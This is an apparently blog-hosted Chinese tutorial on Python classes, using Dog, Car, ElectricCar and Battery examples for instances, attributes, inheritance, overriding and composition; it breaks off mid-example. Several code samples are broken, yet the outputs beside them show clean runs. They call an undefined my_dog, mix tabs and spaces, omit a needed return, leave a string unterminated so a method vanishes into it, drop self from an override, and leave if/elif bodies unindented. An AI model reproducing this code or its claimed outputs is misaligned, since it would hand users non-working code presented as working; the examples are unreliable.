<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dg=Dog(<span class="string">&#x27;willie&#x27;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line">my_dog.sit()<span class="comment">#利用对象调用其包含的方法</span></span><br><span class="line">my_dog.roll_over()<span class="comment">#利用对象调用其包含的方法</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Willie is now sitting.</span><br><span class="line">Willie rolled over!</span><br></pre></td></tr></table></figure></div>

<p><strong>创建多个实例</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line"><span class="comment">#创建多个实例对象      </span></span><br><span class="line">my_dog = Dog(<span class="string">&#x27;willie&#x27;</span>, <span class="number">6</span>)</span><br><span class="line">your_dog = Dog(<span class="string">&#x27;lucy&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#对my_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span> + my_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span> + <span class="built_in">str</span>(my_dog.age) + <span class="string">&quot; years old.&quot;</span>)  </span><br><span class="line">my_dog.sit()</span><br><span class="line"><span class="comment">#对your_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nYour dog&#x27;s name is &quot;</span> + your_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your dog is &quot;</span> + <span class="built_in">str</span>(your_dog.age) + <span class="string">&quot; years old.&quot;</span>)</span><br><span class="line">your_dog.sit()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br><span class="line"><span class="string">Willie is now sitting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your dog&#x27;</span>s name is Lucy.</span><br><span class="line">Your dog is 3 years old.</span><br><span class="line">Lucy is now sitting.</span><br></pre></td></tr></table></figure></div>

<h4 id="给属性指定默认值"><a href="#给属性指定默认值" class="headerlink" title="给属性指定默认值"></a>给属性指定默认值</h4><blockquote>
<p>类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 0 miles on it.</span><br></pre></td></tr></table></figure></div>

<h4 id="修改属性的值"><a href="#修改属性的值" class="headerlink" title="修改属性的值"></a>修改属性的值</h4><blockquote>
<p>三种不同的方式修改属性的值：</p>
<ul>
<li>直接通过实例进行修改；</li>
<li>通过方法进行设置；</li>
<li>通过方法进行递增（增加特定的值）。</li>
</ul>
</blockquote>
<p><strong>直接通过实例进行修改</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())	</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;修改属性值&#x27;&#x27;&#x27;</span></span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Audi A4</span><br><span class="line">This car has <span class="number">23</span> miles on it.</span><br></pre></td></tr></table></figure></div>

<p><strong>通过方法进行设置属性值</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">my_new_car = Car(&#x27;audi&#x27;, &#x27;a4&#x27;, 2016)</span></span><br><span class="line"><span class="string">print(my_new_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_new_car.update_odometer(23)</span></span><br><span class="line"><span class="string">my_new_car.read_odometer()             </span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure></div>

<p><strong>通过方法对属性的值进行递增</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">	def increment_odometer(self, miles):</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>将里程表读数增加指定的量<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        self.odometer_reading += miles</span></span><br><span class="line"><span class="string">my_used_car = Car(&#x27;subaru&#x27;, &#x27;outback&#x27;, 2013)</span></span><br><span class="line"><span class="string">print(my_used_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_used_car.update_odometer(23500)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()</span></span><br><span class="line"><span class="string">my_used_car.increment_odometer(100)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()             </span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2013 Subaru Outback</span><br><span class="line">This car has 23500 miles on it.</span><br><span class="line">This car has 23600 miles on it.</span><br></pre></td></tr></table></figure></div>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><blockquote>
<p>使用super()函数将父类和子类串联起来。</p>
<p>创建子类的实例时，Python首先需要完成的任务是给父类的所有属性赋值。创建子类时，父类必须包含在当前文件中，且位于子类前面。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性&quot;&quot;&quot;</span></span><br><span class="line"> 		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Tesla Model S</span><br></pre></td></tr></table></figure></div>

<h4 id="给子类定义属性和方法"><a href="#给子类定义属性和方法" class="headerlink" title="给子类定义属性和方法"></a>给子类定义属性和方法</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">       </span><br><span class="line">my_tesla = ElectricCar(<span class="string">&quot;tesla&quot;</span>,<span class="string">&#x27;model s&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br></pre></td></tr></table></figure></div>

<h4 id="父类函数重载"><a href="#父类函数重载" class="headerlink" title="父类函数重载"></a>父类函数重载</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">	<span class="comment">#对父类的fill_gas_tank()方法进行重载</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>():</span><br><span class="line">		<span class="string">&quot;&quot;&quot;电动车没有油箱&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car doesn&#x27;t need a tank!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="将实例用作属性"><a href="#将实例用作属性" class="headerlink" title="将实例用作属性"></a>将实例用作属性</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Battery</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟电动汽车电瓶的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, battery_size=<span class="number">70</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化电瓶的属性&quot;&quot;&quot;</span></span><br><span class="line">		self.battery_size = battery_size</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_range</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出电瓶的续航里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.battery_size == <span class="number">70</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">240</span></span><br><span class="line">        <span class="keyword">elif</span> self.battery_size == <span class="number">85</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">270</span></span><br><span class="line">        message = <span class="string">&quot;This car can go approximately &quot;</span> + <span class="built_in">str</span>(<span class="built_in">range</span>)</span><br><span class="line">        message += <span class="string">&quot; miles on a full charge.&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性，再初始化电动汽车特有的属性&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line">		self.battery = Battery()</span><br><span class="line">        </span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.battery.describe_battery() </span><br><span class="line">my_tesla.battery.get_range()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br><span class="line">This car can go approximately 240 miles on a full charge.</span><br></pre></td></tr></table></figure></div>

<h3 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h3><h4 id="导入单个类"><a href="#导入单个类" class="headerlink" title="导入单个类"></a>导入单个类</h4><blockquote>
<p>from 文件名 import 类名</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;一个可用于表示汽车的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span 